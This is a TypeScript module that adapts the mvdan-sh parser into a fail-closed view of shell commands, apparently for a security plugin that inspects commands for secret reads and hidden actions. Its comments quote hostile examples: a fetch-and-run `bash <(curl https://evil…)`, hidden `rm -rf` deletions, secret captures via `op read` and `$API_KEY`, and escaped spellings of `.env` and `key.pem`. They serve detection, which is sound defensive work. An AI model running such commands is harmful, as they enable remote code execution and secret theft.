/**
 * The shell parser (plan `docs/plans/2026-09-22-real-shell-parser.md`).
 *
 * One module owns `mvdan-sh` and hands the rest of the repository a small
 * typed view of a command. Nothing else imports the parser, so replacing it is
 * one file.
 *
 * Why a parser at all: three review rounds on the hand-rolled splitters
 * produced fifteen findings across two classes, and each round found the same
 * class in a new spelling. `-T~/path`, then `-sT~/path`, then
 * `-sTconfig/secrets.pem`. A substitution, then a numeric heredoc delimiter,
 * then a heredoc with a trailing redirect. The splitters were an approximation
 * of shell syntax, and an approximation has an unbounded number of spellings
 * that fall outside it.
 *
 * What this does NOT solve, stated here so it is not rediscovered: option
 * grammar. Bash does not know that `curl -T` takes a value, so neither does
 * this. Callers that need to name a target read the plan's section 2 — they
 * name targets only for grammars this repository actually has, and say so
 * otherwise.
 *
 * Fail closed. A command the parser rejects returns `{ ok: false }` with the
 * parser's own message, and every caller reads that as "this command was not
 * read" rather than as a command with no actions in it.
 *
 * The parser module itself is loaded on first use, not at import: a missing or
 * broken `mvdan-sh` must fail the parse, never the plugin's load. If the load
 * fails, `parseShell` returns `{ ok: false }` on every call — the same answer
 * as a syntax error, whether the parser is absent or merely disagreed.
 */
import { createRequire } from "node:module";
// Type-only: erased at runtime, so nothing here resolves `mvdan-sh` while the
// module loads. The runtime side goes through `loadSh` below.
import type { Parser, Syntax } from "mvdan-sh";

const requireSh = createRequire(import.meta.url);

/** Loader contract: return the `mvdan-sh` module object, or throw. */
type ShLoader = () => unknown;

type ShModule = { syntax: Syntax };

type RedirectOpName =
	| "out"
	| "append"
	| "in"
	| "hereString"
	| "dupOut"
	| "dupIn"
	| "heredoc"
	| "heredocDash"
	| "readWrite"
	| "clobber"
	| "both"
	| "bothAppend";
type BinaryOpName = "pipe" | "and" | "or";

/**
 * Resolves the parser module. Overridable only through
 * `setShellParserLoader`, which the tests for this file use to stub a load
 * that fails; production never touches it.
 */
let loadSh: ShLoader = () => requireSh("mvdan-sh");

/** Everything the AST readers below need, derived once from a live module. */
interface ShellRuntime {
	syntax: Syntax;
	parser: Parser;
	redirect: Record<RedirectOpName, number>;
	binary: Record<BinaryOpName, number>;
	redirectDirection: Record<number, ShellRedirect["direction"] | undefined>;
}

let runtime: ShellRuntime | undefined;

/**
 * Derives the runtime from a loaded module. Throws when the module is missing,
 * the wrong shape, or the operator probes come back empty — all three mean
 * "the parser could not be stood up", which the callers read as unavailable.
 */
const deriveRuntime = (mod: unknown): ShellRuntime => {
	// The GopherJS build ships no module-level types; the cast is checked by
	// the guard beside it, and everything below it goes through Syntax.
	const candidate = mod as ShModule | undefined;
	const syntax = candidate?.syntax;
	if (!syntax || typeof syntax.NewParser !== "function") throw new TypeError("mvdan-sh: unexpected module shape, no syntax parser");
	const parser = syntax.NewParser(syntax.Variant(syntax.LangBash), syntax.KeepComments(false));

	/**
	 * Operator constants, derived rather than copied.
	 *
	 * The GopherJS build exposes operators as bare numbers with no names.
	 * Copying the numbers into this file would make a library upgrade that
	 * renumbers them silently wrong in a security boundary, so each one is
	 * read back from a parse of the spelling it belongs to.
	 */
	const operatorOf = (source: string, type: "Redirect" | "BinaryCmd"): number => {
		// Local walk, not the module-level one: walk() calls getShell(), and
		// the runtime is not assigned until this function returns, so touching
		// it here would re-enter this derivation forever.
		let op: number | undefined;
		syntax.Walk(parser.Parse(source, "command.sh"), node => {
			if (node && op === undefined && syntax.NodeType(node) === type) {
				op = (node as { Op: number }).Op;
				return false;
			}
			return true;
		});
		if (op === undefined) throw new Error(`shell-ast: no ${type} in the probe ${JSON.stringify(source)}`);
		return op;
	};

	const redirect: Record<RedirectOpName, number> = {
		out: operatorOf("a > b", "Redirect"),
		append: operatorOf("a >> b", "Redirect"),
		in: operatorOf("a < b", "Redirect"),
		hereString: operatorOf("a <<< b", "Redirect"),
		dupOut: operatorOf("a >&1", "Redirect"),
		dupIn: operatorOf("a <&0", "Redirect"),
		heredoc: operatorOf("a <<EOF\nbody\nEOF\n", "Redirect"),
		heredocDash: operatorOf("a <<-EOF\nbody\nEOF\n", "Redirect"),
		readWrite: operatorOf("a <> b", "Redirect"),
		clobber: operatorOf("a >| b", "Redirect"),
		both: operatorOf("a &> b", "Redirect"),
		bothAppend: operatorOf("a &>> b", "Redirect"),
	};

	const binary: Record<BinaryOpName, number> = {
		pipe: operatorOf("a | b", "BinaryCmd"),
		and: operatorOf("a && b", "BinaryCmd"),
		or: operatorOf("a || b", "BinaryCmd"),
	};

	const redirectDirection: Record<number, ShellRedirect["direction"] | undefined> = {
		[redirect.out]: "out",
		[redirect.append]: "out",
		[redirect.clobber]: "out",
		[redirect.dupOut]: "out",
		[redirect.both]: "out",
		[redirect.bothAppend]: "out",
		[redirect.in]: "in",
		[redirect.dupIn]: "in",
		[redirect.hereString]: "in",
		[redirect.heredoc]: "in",
		[redirect.heredocDash]: "in",
		[redirect.readWrite]: "both",
	};

	return { syntax, parser, redirect, binary, redirectDirection };
};

/** The live runtime, loading and deriving the parser on first use. */
const getShell = (): ShellRuntime => {
	if (!runtime) runtime = deriveRuntime(loadSh());
	return runtime;
};

/**
 * Swaps the module loader, for the tests that stub a broken parser load:
 * the next parse re-loads through `loader`. Returns the previous loader so
 * the caller can put it back.
 */
export function setShellParserLoader(loader: ShLoader): ShLoader {
	const previous = loadSh;
	loadSh = loader;
	runtime = undefined;
	return previous;
}

const nodeType = (node: NonNullable<unknown>): string => getShell().syntax.NodeType(node);

/** The parser's own handle, so its callers stay unchanged. */
function parse(source: string): unknown {
	return getShell().parser.Parse(source, "command.sh");
}

/** Depth-first walk. Returning false stops the descent. */
function walk(tree: unknown, visit: (node: unknown) => boolean): void {
	getShell().syntax.Walk(tree, node => {
		if (node) return visit(node);
		return true;
	});
}

/** The operator table, for the test that pins it against real spellings. */
export const SHELL_OPERATORS = {
	get redirect(): Record<RedirectOpName, number> {
		return getShell().redirect;
	},
	get binary(): Record<BinaryOpName, number> {
		return getShell().binary;
	},
};

/** How one command was joined to the one before it. `first` opens a list. */
export type ShellJoin = "first" | "pipe" | "and" | "or" | "sequence";

export interface ShellWord {
	/** The word exactly as written, quotes and all. */
	source: string;
	/**
	 * The word as the shell will see it: quotes removed, a parameter rendered
	 * as `$NAME`, a substitution as `$(…)`. A regex that wants to find a path
	 * or a store read reads this.
	 */
	value: string;
	/** The word with every expansion replaced by its default or operand, or
	 *  by nothing: what the shell produces when the variables are unset. A
	 *  path check reads both, because `${SAFE:-key.pem}` opens `key.pem`. */
	alternate: string;
	/** True when every part was a literal: no expansion, no substitution. */
	literal: boolean;
	/** Names this word expands, anywhere inside it: `${BRACED}`, the
	 *  `$API_KEY` in `${SAFE:-$API_KEY}`, `${#LEN}`, and the bare names an
	 *  arithmetic expansion reads. */
	variables: string[];
	/** True when the word contains a command substitution. */
	substitution: boolean;
	/**
	 * The commands whose output this word takes in, through `$(…)` or `<(…)`.
	 * Only the substitution's own level: a command nested deeper hangs off a
	 * word of the command that contains it. Every one of them is also in the
	 * flat list, marked `nested`.
	 *
	 * The floor needs the link, because a secret a nested command prints lands
	 * wherever this word lands: a capture, a request header, or a print.
	 */
	commands: ShellCommand[];
}

export interface ShellRedirect {
	/** `both` is `<>`, which opens its target for reading and writing. */
	direction: "in" | "out" | "both";
	append: boolean;
	/** `>&1` and `2>&1` name an open stream rather than a file. */
	duplicate: boolean;
	/** A heredoc or here-string. Its target is a delimiter or a literal body,
	 *  never a path, and its body is data rather than commands. */
	here: boolean;
	/** The file descriptor the operator carries: "" for the default, "2" for
	 *  stderr, "&" for both streams. */
	fd: string;
	target: ShellWord;
	/** A heredoc's body. An unquoted delimiter expands it, so its variables
	 *  and substitutions run like any other word's. */
	body?: ShellWord;
}

export interface ShellAssign {
	name: string;
	/** Absent for a bare `NAME=`; carries the substitution flag for a capture. */
	value: ShellWord | undefined;
	/** The elements of `arr=(a "$B")`, and the index of `arr[$i]=x`. */
	array: ShellWord[];
}

export interface ShellCommand {
	/** The verb first, then its arguments, in source order. */
	words: ShellWord[];
	assigns: ShellAssign[];
	redirects: ShellRedirect[];
	join: ShellJoin;
	/** True when this command sits inside a substitution rather than at the
	 *  top level, so `echo "$(rm -rf build)"` reports the delete as its own
	 *  command and marks it nested. */
	nested: boolean;
	/**
	 * Set for `[[ … ]]`, `(( … ))` and `let`, which evaluate their words and
	 * print nothing. The first word is a synthetic verb (`[[`, `((`, `let`),
	 * and the rest are every word inside the expression.
	 */
	expression?: "test" | "arithmetic";
	/**
	 * Set when this entry stands for a command shape the adapter could not
	 * decompose, naming the shape. It carries no words, and a caller must read
	 * it as "something ran here that was not read" rather than as nothing.
	 *
	 * Silence was the alternative, and it failed open: `time rm -rf build` and
	 * `coproc rm -rf build` produced an empty command list, which every caller
	 * would have read as a command that does nothing.
	 */
	unreadShape?: string;
}

export type ShellParse = { ok: true; commands: ShellCommand[] } | { ok: false; reason: string };

/**
 * Parse one command into a flat list of the commands it runs, in source order,
 * each carrying how it was joined to the one before it.
 *
 * Flat rather than a tree because every consumer asks the same two questions:
 * what does this command do, and did the previous command's output reach it.
 */
export function parseShell(text: string): ShellParse {
	let tree: unknown;
	try {
		tree = parse(text);
	} catch (err) {
		// A load failure — a missing or broken parsers module — surfaces here
		// with the load error: parseShell reads it as "this command was not
		// read", the same answer as a syntax error.
		return { ok: false, reason: parserMessage(err) };
	}
	try {
		const commands: ShellCommand[] = [];
		// Only the very first command opens the list. A statement after `;` or a
		// newline is a sequence: it passes nothing, but it is not the start.
		// biome-ignore lint/suspicious/noExplicitAny: untyped AST
		for (const stmt of (tree as any).Stmts ?? []) collectStmt(stmt, commands.length === 0 ? "first" : "sequence", false, text, commands);
		return { ok: true, commands };
	} catch (err) {
		// A shape this adapter does not handle is a command it did not read,
		// which is the same answer as a syntax error.
		return { ok: false, reason: `unreadable command: ${err instanceof Error ? err.message : String(err)}` };
	}
}

/** The parser's own message. Its error is a Go value whose `toString` is
 *  `[object Object]`, so the text comes from `Text` or `Error()`. */
function parserMessage(err: unknown): string {
	const value = err as { Text?: unknown; Error?: () => unknown } | null;
	if (value && typeof value.Text === "string" && value.Text !== "") return value.Text;
	if (value && typeof value.Error === "function") return String(value.Error());
	return err instanceof Error ? err.message : String(err);
}

/**
 * Collect one statement into `out` and return the commands it produced at its
 * own level. Commands inside its substitutions go into `out` too, marked
 * nested, but hang off the word that contains them rather than being returned.
 */
// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function collectStmt(stmt: any, join: ShellJoin, nested: boolean, source: string, out: ShellCommand[]): ShellCommand[] {
	const cmd = stmt?.Cmd;
	const type = cmd ? nodeType(cmd) : "";
	if (type === "BinaryCmd") {
		return [...collectStmt(cmd.X, join, nested, source, out), ...collectStmt(cmd.Y, joinOf(cmd.Op), nested, source, out)];
	}
	const redirs = stmt?.Redirs ?? [];
	if (type === "CallExpr" || type === "DeclClause") {
		// Pushed before its words are read, so the command comes ahead of the
		// commands in its substitutions: `echo "$(rm -rf build)"` lists echo,
		// then rm.
		const command: ShellCommand = { words: [], assigns: [], redirects: [], join, nested };
		out.push(command);
		if (type === "CallExpr") readCall(cmd, command, source, out);
		else readDecl(cmd, command, source, out);
		command.redirects = redirs.map((redir: any) => readRedirect(redir, source, out));
		return [command];
	}
	const expression = EXPRESSION_SHAPES[type];
	if (expression !== undefined) {
		const command: ShellCommand = { words: [], assigns: [], redirects: [], join, nested, expression: expression.kind };
		out.push(command);
		command.words = [literalWord(expression.verb), ...expressionWords(cmd, expression.kind === "arithmetic", source, out)];
		command.redirects = redirs.map((redir: any) => readRedirect(redir, source, out));
		return [command];
	}
	// Every other command shape: a subshell, a block, a loop, a conditional, a
	// function, `time`, `coproc`, or whatever the grammar gains next. The
	// statements inside are found by walking rather than by enumerating the
	// shapes, because an enumeration that misses one drops every command under
	// it silently — which is how `time rm -rf build` came to summarize as
	// nothing at all.
	const own: ShellCommand[] = [];
	if (redirs.length > 0) {
		const carrier: ShellCommand = { words: [], assigns: [], redirects: [], join, nested };
		out.push(carrier);
		own.push(carrier);
		carrier.redirects = redirs.map((redir: any) => readRedirect(redir, source, out));
	}
	// A compound's header is not a statement and carries commands of its own:
	// the `$(ls)` of `for f in $(ls)`. Statements own the substitutions inside
	// them, so this walk stops at each one. These belong to no word, so a
	// caller finds them only in the flat list.
	const substitutions = collectSubstitutions(cmd, source, out);
	const inner = shallowStmts(cmd);
	for (const stmt of inner) own.push(...collectStmt(stmt, join, nested, source, out));
	// Nothing read at all is still a command that ran.
	if (inner.length === 0 && substitutions.length === 0 && cmd) {
		const marker: ShellCommand = { words: [], assigns: [], redirects: [], join, nested, unreadShape: type };
		out.push(marker);
		own.push(marker);
	}
	return own;
}

/** The shapes that evaluate words without running a command. Read as an
 *  unnamed marker they were invisible to the floor, and under `set -x` the
 *  shell prints what `[[ -n "$API_KEY" ]]` expanded. */
const EXPRESSION_SHAPES: Record<string, { kind: "test" | "arithmetic"; verb: string }> = {
	TestClause: { kind: "test", verb: "[[" },
	ArithmCmd: { kind: "arithmetic", verb: "((" },
	LetClause: { kind: "arithmetic", verb: "let" },
};

/** Every word inside an expression, outermost first. In arithmetic a bare
 *  name is a variable, so it counts as one. */
// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function expressionWords(node: any, arithmetic: boolean, source: string, out: ShellCommand[]): ShellWord[] {
	const words: ShellWord[] = [];
	walk(node, (inner: unknown) => {
		if (!inner || nodeType(inner) !== "Word") return true;
		const word = readWord(inner, source, out);
		if (arithmetic && word.literal && IDENTIFIER.test(word.value)) word.variables.push(word.value);
		words.push(word);
		// The word read its own parts, substitutions included.
		return false;
	});
	return words;
}

const IDENTIFIER = /^[A-Za-z_][A-Za-z0-9_]*$/u;

const literalWord = (text: string): ShellWord => ({ source: text, value: text, alternate: text, literal: true, variables: [], substitution: false, commands: [] });

// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function readCall(cmd: any, command: ShellCommand, source: string, out: ShellCommand[]): void {
	command.assigns = (cmd.Assigns ?? []).map((assign: any) => readAssign(assign, source, out));
	command.words = (cmd.Args ?? []).map((word: any) => readWord(word, source, out));
}

/**
 * `declare`, `local`, `export`, `readonly`, `typeset`: the parser reads their
 * arguments as assignments, which is what the shell does. The verb becomes the
 * first word, a flag such as `-x` a word after it, and `NAME=value` an
 * assignment, so `export KEY="$(op read …)"` is the capture it looks like.
 */
// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function readDecl(cmd: any, command: ShellCommand, source: string, out: ShellCommand[]): void {
	const variant = cmd.Variant?.Value ?? "declare";
	command.words = [literalWord(variant)];
	for (const assign of cmd.Args ?? []) {
		if (assign.Naked && !assign.Name) command.words.push(readWord(assign.Value, source, out));
		else command.assigns.push(readAssign(assign, source, out));
	}
}

// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function readAssign(assign: any, source: string, out: ShellCommand[]): ShellAssign {
	const value = assign.Value ? readWord(assign.Value, source, out) : undefined;
	// `arr=("$API_KEY")` assigns a value the value word never held. Left out,
	// the array was a capture of nothing and `${arr[0]}` printed a secret the
	// floor never saw leave.
	const array: ShellWord[] = [];
	for (const node of [assign.Array, assign.Index]) {
		if (!node) continue;
		walk(node, (inner: unknown) => {
			if (!inner || nodeType(inner) !== "Word") return true;
			array.push(readWord(inner, source, out));
			return false;
		});
	}
	return { name: assign.Name?.Value ?? "", value, array };
}

/**
 * The shallowest statements inside a node: the walk stops descending as soon
 * as it finds one, so a nested compound is collected once by its own
 * recursion rather than twice.
 */
// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function shallowStmts(cmd: any): any[] {
	if (!cmd) return [];
	const found: any[] = [];
	walk(cmd, (node: unknown) => {
		if (!node) return true;
		const type = nodeType(node);
		// A substitution's statements belong to collectSubstitutions, which
		// marks them nested. Collecting them here as well reported the command
		// inside `declare KEY=$(op read …)` twice.
		if (type === "CmdSubst" || type === "ProcSubst") return false;
		if (type === "Stmt") {
			found.push(node);
			return false;
		}
		return true;
	});
	return found;
}

/**
 * Every substitution inside a node, collected as commands, and the ones at the
 * substitution's own level returned.
 *
 * Both spellings count. `$(…)` runs its commands for their output; `<(…)` runs
 * them for a file descriptor, which is how `bash <(curl https://evil…)` runs a
 * download without ever naming a pipe.
 */
// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function collectSubstitutions(node: any, source: string, out: ShellCommand[]): ShellCommand[] {
	const own: ShellCommand[] = [];
	if (!node) return own;
	walk(node, (inner: unknown) => {
		if (!inner) return true;
		const type = nodeType(inner);
		// A statement owns the substitutions inside it, and collectStmt has
		// already been given it. Descending here would collect them twice.
		if (type === "Stmt") return false;
		if (type !== "CmdSubst" && type !== "ProcSubst") return true;
		// biome-ignore lint/suspicious/noExplicitAny: untyped AST
		for (const stmt of (inner as any).Stmts ?? []) own.push(...collectStmt(stmt, "sequence", true, source, out));
		// Its own statements were just collected, and each recurses on its own.
		return false;
	});
	return own;
}

const joinOf = (op: number): ShellJoin => {
	const { binary } = getShell();
	if (op === binary.pipe) return "pipe";
	if (op === binary.and) return "and";
	if (op === binary.or) return "or";
	// `|&` and anything else the grammar adds: not a plain pipe, and not a
	// separator that passes nothing. Reading it as a pipe is the conservative
	// side, because the exemptions that care about pipes all narrow.
	return "pipe";
};

// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function readRedirect(redir: any, source: string, out: ShellCommand[]): ShellRedirect {
	const { redirect: op, redirectDirection } = getShell();
	const code = redir.Op as number;
	const direction = redirectDirection[code];
	// An operator this table does not name is a redirect this adapter did not
	// read. Guessing a direction is how `<>` came to read as output only.
	if (direction === undefined) throw new Error(`unknown redirect operator ${code}`);
	const duplicate = code === op.dupOut || code === op.dupIn;
	const here = code === op.hereString || code === op.heredoc || code === op.heredocDash;
	const both = code === op.both || code === op.bothAppend;
	const redirect: ShellRedirect = {
		direction,
		append: code === op.append || code === op.bothAppend,
		duplicate,
		here,
		fd: both ? "&" : (redir.N?.Value ?? ""),
		target: readWord(redir.Word, source, out),
	};
	// The body of `cat <<EOF` runs its `$(…)` when the delimiter is unquoted.
	// Left unread, a heredoc body hid every command substituted into it.
	if (redir.Hdoc) redirect.body = readWord(redir.Hdoc, source, out);
	return redirect;
}

// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function readWord(word: any, source: string, out: ShellCommand[]): ShellWord {
	if (!word) return { ...literalWord(""), source: "" };
	const flags = { literal: true, substitution: false };
	const value = renderParts(word.Parts ?? [], source, "value", false, flags);
	const alternate = renderParts(word.Parts ?? [], source, "alternate", false, { literal: true, substitution: false });
	const variables: string[] = [];
	collectVariables(word, variables);
	// One walk per word visits each node once, as one walk per call did: the
	// words of a call are disjoint subtrees.
	const commands = collectSubstitutions(word, source, out);
	return { source: sliceOf(word, source), value, alternate, literal: flags.literal, variables, substitution: flags.substitution, commands };
}

/**
 * `value` keeps each expansion visible as `$NAME` or its source text.
 * `alternate` replaces each one with what it produces when the variable is
 * unset: its default or operand (`${SAFE:-key.pem}` gives `key.pem`), or
 * nothing (`$SAFE.env` gives `.env`). A substitution gives nothing in both.
 */
type Rendering = "value" | "alternate";

// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function renderParts(parts: any[], source: string, mode: Rendering, quoted: boolean, flags: { literal: boolean; substitution: boolean }): string {
	return parts.map(part => renderPart(part, source, mode, quoted, flags)).join("");
}

// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function renderPart(part: any, source: string, mode: Rendering, quoted: boolean, flags: { literal: boolean; substitution: boolean }): string {
	switch (nodeType(part)) {
		case "Lit":
			return unescapeLit(part.Value ?? "", quoted);
		case "SglQuoted":
			// `$'\x2eenv'` is `.env` to the shell.
			return part.Dollar ? decodeAnsiC(part.Value ?? "") : (part.Value ?? "");
		case "DblQuoted":
			return renderParts(part.Parts ?? [], source, mode, true, flags);
		case "ParamExp": {
			flags.literal = false;
			if (mode === "value") return part.Short ? `$${part.Param?.Value ?? ""}` : sliceOf(part, source);
			const operand = part.Exp?.Word ?? part.Repl?.With;
			return operand ? renderParts(operand.Parts ?? [], source, mode, quoted, flags) : "";
		}
		case "CmdSubst":
			flags.literal = false;
			flags.substitution = true;
			return mode === "value" ? "$(…)" : "";
		default:
			// An arithmetic expansion, a process substitution, an extended
			// glob: kept as written, and never literal.
			flags.literal = false;
			return sliceOf(part, source);
	}
}

/** Quote removal for backslashes, which the parser leaves in a literal.
 *  Unquoted, a backslash escapes any character, so `.e\nv` is `.env`. Inside
 *  double quotes it escapes only `$`, backtick, `"`, `\` and a newline. */
function unescapeLit(text: string, quoted: boolean): string {
	return quoted ? text.replace(/\\([$`"\\\n])/gu, "$1") : text.replace(/\\(.)/gsu, "$1");
}

/** The last source string and the byte view the offset conversion needs. The
 *  parser reports offsets into the UTF-8 bytes it was handed, and a JavaScript
 *  string index counts UTF-16 code units, so the two agree only while the text
 *  is ASCII: `echo 漢字 $(rm important)` has the substitution starting at byte
 *  15 and index 11, and slicing by the byte offset lands mid-word. Most
 *  commands are ASCII, so that case is answered with no copy at all, and the
 *  rest are decoded from the bytes the offsets were measured in. */
interface SourceBytes {
	source: string;
	ascii: boolean;
	bytes?: Uint8Array;
}

let lastSource: SourceBytes | undefined;

function sourceBytes(source: string): SourceBytes {
	if (lastSource?.source === source) return lastSource;
	// biome-ignore lint/suspicious/noControlCharactersInRegex: the ASCII range is the question
	const ascii = !/[^\u0000-\u007f]/u.test(source);
	lastSource = ascii ? { source, ascii } : { source, ascii, bytes: Buffer.from(source, "utf8") };
	return lastSource;
}

/** A parser node's byte range. `mvdan-sh` ships no TypeScript declarations, so
 *  the two methods are read structurally at this one boundary rather than
 *  trusted; the caller's node comes from the same untyped AST. */
interface ParserRange {
	Pos(): { Offset(): number };
	End(): { Offset(): number };
}

function sliceOf(node: unknown, source: string): string {
	try {
		const range = node as ParserRange; // untyped parser AST, per the interface note above
		const from = range.Pos().Offset();
		const to = range.End().Offset();
		const view = sourceBytes(source);
		if (view.ascii) return source.slice(from, to);
		return Buffer.from((view.bytes as Uint8Array).subarray(from, to)).toString("utf8");
	} catch {
		return "";
	}
}

/** The verb of a command: its first word's value, or "" for an assignment-only
 *  command such as `KEY=$(…)`. */
export function verbOf(command: ShellCommand): string {
	return command.words[0]?.value ?? "";
}

/** The verb with any directory part removed, which is the name PATH would have
 *  resolved. `./deploy.sh` and `/usr/local/bin/deploy.sh` both give
 *  `deploy.sh`; whether a command spelled as a path may be trusted is the
 *  caller's question, not this one's. */
export function verbName(command: ShellCommand): string {
	const verb = verbOf(command);
	return verb.split("/").filter(part => part.length > 0).pop() ?? verb;
}

/**
 * The inner text of every `$(…)`, `<(…)` and backtick substitution in `text`,
 * whatever its depth: `$(echo $(curl …))` yields both `echo $(curl …)` and
 * `curl …`.
 *
 * The parser decides where a substitution is, so quoting and nesting are read
 * the way bash reads them: the `$(curl …)` inside `'…'` is data and yields
 * nothing, a quoted heredoc's body is data, and an unquoted body's
 * substitution runs. A node's slice keeps its delimiters, so each span is the
 * node text stripped of one leading `$(`, `<(` or backtick and one trailing
 * `)` or backtick — scanning a span that holds a pipeline whole would leave
 * the closer tangled into the last word.
 *
 * Text the parser rejects ({@link parseShell} answers "not read" there) falls
 * back to a quote-blind pairing of `$(` with the next `)`: an approximation
 * whose false positives quote in the fail-closed direction, in exchange for
 * still seeing the tail of a genuinely executed substitution.
 */
export function substitutionSpans(text: string): string[] {
	if (!/\$\(|`|<\(/u.test(text)) return [];
	const parsed = parseShell(text);
	if (!parsed.ok) {
		const spans: string[] = [];
		for (const m of text.matchAll(/\$\(([^)]*)\)/gu)) spans.push(m[1]);
		for (const m of text.matchAll(/`([^`]*)`/gu)) spans.push(m[1]);
		const dollarTail = /\$\(([^)]*)$/u.exec(text);
		if (dollarTail) spans.push(dollarTail[1]);
		const backtickTail = /`([^`]*)$/u.exec(text);
		if (backtickTail) spans.push(backtickTail[1]);
		return spans;
	}
	const spans: string[] = [];
	// biome-ignore lint/suspicious/noExplicitAny: untyped AST
	walk(parse(text), (node: unknown) => {
		if (!node) return true;
		const type = nodeType(node);
		if (type !== "CmdSubst" && type !== "ProcSubst") return true;
		const inner = sliceOf(node, text);
		spans.push(inner.replace(/^\$\(|^<\(|^`/u, "").replace(/\)$|`$/u, ""));
		return true;
	});
	return spans;
}

/**
 * Every name a word expands: each parameter expansion however deep, and each
 * bare name inside arithmetic. Stops at a substitution, whose commands are
 * read as commands.
 */
// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function collectVariables(word: any, variables: string[]): void {
	const add = (name: string): void => {
		if (name !== "" && !variables.includes(name)) variables.push(name);
	};
	walk(word, (inner: unknown) => {
		if (!inner) return true;
		const type = nodeType(inner);
		if (type === "CmdSubst" || type === "ProcSubst") return false;
		// biome-ignore lint/suspicious/noExplicitAny: untyped AST
		if (type === "ParamExp") add((inner as any).Param?.Value ?? "");
		if (type !== "ArithmExp") return true;
		for (const name of arithmeticNames(inner)) add(name);
		return false;
	});
}

/** The names an arithmetic expression reads, bare or `$`-prefixed. A
 *  separate walk rather than a flag on the outer one, because the Go build
 *  hands back a fresh wrapper per visit and a node cannot be told from itself. */
// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function arithmeticNames(node: any): string[] {
	const names: string[] = [];
	walk(node, (inner: unknown) => {
		if (!inner) return true;
		const type = nodeType(inner);
		if (type === "CmdSubst" || type === "ProcSubst") return false;
		// biome-ignore lint/suspicious/noExplicitAny: untyped AST
		const value = type === "ParamExp" ? ((inner as any).Param?.Value ?? "") : type === "Lit" ? ((inner as any).Value ?? "") : "";
		if (IDENTIFIER.test(value)) names.push(value);
		return true;
	});
	return names;
}

/** A code point bash would emit, or the escape as written when it is out of
 *  range. */
const codePoint = (value: number, written: string): string => (value <= 0x10ffff ? String.fromCodePoint(value) : written);

/** Decode the body of `$'…'` the way bash does, for the escapes that can
 *  spell a path: hex, octal, unicode, and the single-character ones. */
function decodeAnsiC(body: string): string {
	const simple: Record<string, string> = { n: "\n", t: "\t", r: "\r", a: "\x07", b: "\b", e: "\x1b", E: "\x1b", f: "\f", v: "\v", "\\": "\\", "'": "'", '"': '"', "?": "?" };
	const decoded = body.replace(/\\(x[0-9a-fA-F]{1,2}|u[0-9a-fA-F]{1,4}|U[0-9a-fA-F]{1,8}|[0-7]{1,3}|c.|.)/gsu, (whole, escape: string) => {
		const kind = escape[0];
		// `\x` with no digits after it is a literal backslash and x.
		if (kind === "x" || kind === "u" || kind === "U") return escape.length > 1 ? codePoint(Number.parseInt(escape.slice(1), 16), whole) : whole;
		if (/[0-7]/u.test(kind)) return codePoint(Number.parseInt(escape, 8), whole);
		if (kind === "c") return String.fromCodePoint(escape.charCodeAt(1) & 0x1f);
		return simple[escape] ?? whole;
	});
	// Bash builds the string in C, so a NUL ends it: `$'key.pem\0x'` is
	// `key.pem`.
	return decoded.split("\0")[0];
}

